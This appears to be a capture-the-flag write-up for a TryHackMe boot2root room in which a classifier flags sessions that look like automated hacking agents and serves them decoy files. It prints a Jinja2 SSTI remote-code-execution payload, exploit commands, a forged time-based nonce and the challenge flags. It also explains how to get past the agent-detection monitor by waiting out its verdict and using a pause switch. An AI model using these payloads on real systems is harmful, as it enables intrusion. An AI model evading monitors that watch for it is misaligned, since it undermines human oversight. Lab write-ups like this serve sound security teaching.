# EchoChamber

**Category:** boot2root · **Points:** 170 (user) · **Solves:** 56 (user) · **Flags:** `isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}` (user) · `isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}` (root)

## Challenge

> Deploy the box: `https://tryhackme.com/jr/cryovault20263` — Flag format: `isfcr{...}`

A boot2root where the box *watches how you type*. If a behavioural classifier
decides your session looks like an automated hacking agent, a root-owned
"warden" service silently swaps key files (including the flags) for decoys. The
trick isn't a new exploit for root — it's realising the box is gaslighting you
and using its own published mechanisms to get the real view.

> Authorized, disposable TryHackMe room; target IP changes per deploy. Uses
> `<target>` as a placeholder.

## Initial Analysis

`nmap -sC -sV -p22,80` showed SSH and an nginx-fronted web app ("Anadyne Alert
Review Console"). The login page openly advertises dev credentials:

```
analyst : analyst
```

After login the dashboard is unusually chatty about its own internals — this is
the challenge warning you:

- classifier source at `/opt/echochamber/classifier.py`;
- verdicts written to `/var/log/echo/verdicts.jsonl`;
- a warden that swaps symlinks when a session "looks automated";
- terminal input monitored via a preloaded `libechotap.so`.

In other words: blindly pasting `whoami; id; sudo -l; ./linpeas.sh` will change
what the box shows you.

## Vulnerability / Core Concept

```
analyst:analyst login
  -> Jinja2 SSTI in /api/alert/preview  -> RCE as analyst
  -> read classifier/warden source, understand the decoy swap
  -> let the "agent" verdict go stale, freeze the warden in HUMAN mode
  -> forge sentinel's time-based nonce
  -> sentinel runs our command with CAP_DAC_READ_SEARCH -> reads the real flags
```

**1. Jinja2 SSTI.** `POST /api/alert/preview` concatenates `title` and `body`
into a string passed to `render_template_string()`. `{"title":"{{7*7}}"}`
previews `49`. Escalate to RCE:

```jinja2
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

Runs as `uid=1001(analyst)`. See `exploit.py` — it base64-wraps the command so
quotes/metacharacters never touch the Jinja expression.

**2. The echo chamber (why files are fake).** Spawned shells preload
`libechotap.so`, which logs input; `classifier.py` scores the session on known
tool strings (`linpeas.sh`, typical `nmap`, reverse-shell snippets), common
enumeration openers, machine-like timing regularity, uniform command lengths,
and a character-bigram human-vs-agent model. Score `> 0.50` → `agent` verdict.
The root warden then flips these symlinks between `/var/lib/warden/real/` and
`/var/lib/warden/decoy/`:

```
/home/sentinel/user.txt   /root/root.txt
/etc/sentinel/dispatch.json   /etc/sentinel/suid.conf
```

Crucially the *real* `dispatch.json` exposes a `shell` op; the decoy omits it.
So a readable flag string is not enough — you need the real dispatch table too.

**3. The pause switch.** Both classifier and warden document a kill switch at
`/opt/echochamber/pause`. Writing `pause` freezes the warden's **current** mode
for ~60s. The warden treats an `agent` verdict as stale after ~20s. So: stop
typing, let the verdict decay to `human`, then press pause — freezing the
*real* view, not the decoys.

**4. Sentinel's predictable nonce.** `/opt/sentinel/sentinel.py` listens on a
mode-`0666` Unix socket `/run/sentinel/ctrl.sock`. Its `shell` op is "gated" by
a nonce that is just a public formula:

```python
nonce = sha256(f"{int(time.time())//60}:sentinel-salt-v1-a3b7c2d9").hexdigest()[:16]
```

(current minute ±1 accepted). Sentinel runs as the `sentinel` user with ambient
`CAP_DAC_READ_SEARCH`, and the capability is inherited by its child shell — so
that child bypasses discretionary read checks and can read the `0640` user flag
and even root-only `/root/root.txt`. **This is the whole box:** root isn't a
shell, it's a capability-enabled file read.

## Exploitation

**Get the environment into HUMAN mode and frozen**, using a single
non-fingerprinted command through the SSTI:

```bash
./exploit.py 'sleep 25; printf pause > /opt/echochamber/pause; sleep 2; cat /var/lib/warden/warden.state'
# verify the targets resolve under real/, not decoy/:
./exploit.py 'readlink -f /root/root.txt; readlink -f /etc/sentinel/dispatch.json'
```

**Stage the sentinel client** (`sentinel_client.py`, included) and talk to the
socket during the pause window. It computes the minute nonce, base64-encodes the
payload, and asks sentinel to run it:

```bash
B64=$(base64 -w0 sentinel_client.py)
./exploit.py "echo $B64 | base64 -d > /tmp/sentinel_client.py"

# user flag:
./exploit.py "python3 /tmp/sentinel_client.py 'cat /home/sentinel/user.txt'"
# root flag:
./exploit.py "python3 /tmp/sentinel_client.py 'cat /root/root.txt'"
```

Sentinel executes `/bin/sh -c <payload>` as `sentinel`, the child keeps
`CAP_DAC_READ_SEARCH`, and the JSON reply carries the real flag in `stdout`.

## Flag

```
isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}   # user
isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}   # root
```

The root flag *is* the lesson: if ordinary enumeration is what the box detects,
stop playing that game and study the mechanism changing your environment.

## Included files

- `exploit.py` — login + SSTI command runner (TARGET redacted; set your instance IP).
- `sentinel_client.py` — computes the time nonce and runs a command via the `CAP_DAC_READ_SEARCH` sentinel socket.

## Key Takeaways

- A world-writable "pause" control over a root security service is itself the
  vulnerability — the challenge hands you the off-switch and documents it.
- A `0666` Unix socket is not an authorization boundary, and a nonce derived
  from a *public* salt + wall clock is predictable, not secret.
- `CAP_DAC_READ_SEARCH` bypasses file-read DAC — never let it reach an arbitrary
  command runner whose children inherit it.
- Deception/decoys slow an attacker but don't fix the SSTI, default creds, or
  broken socket authz underneath.
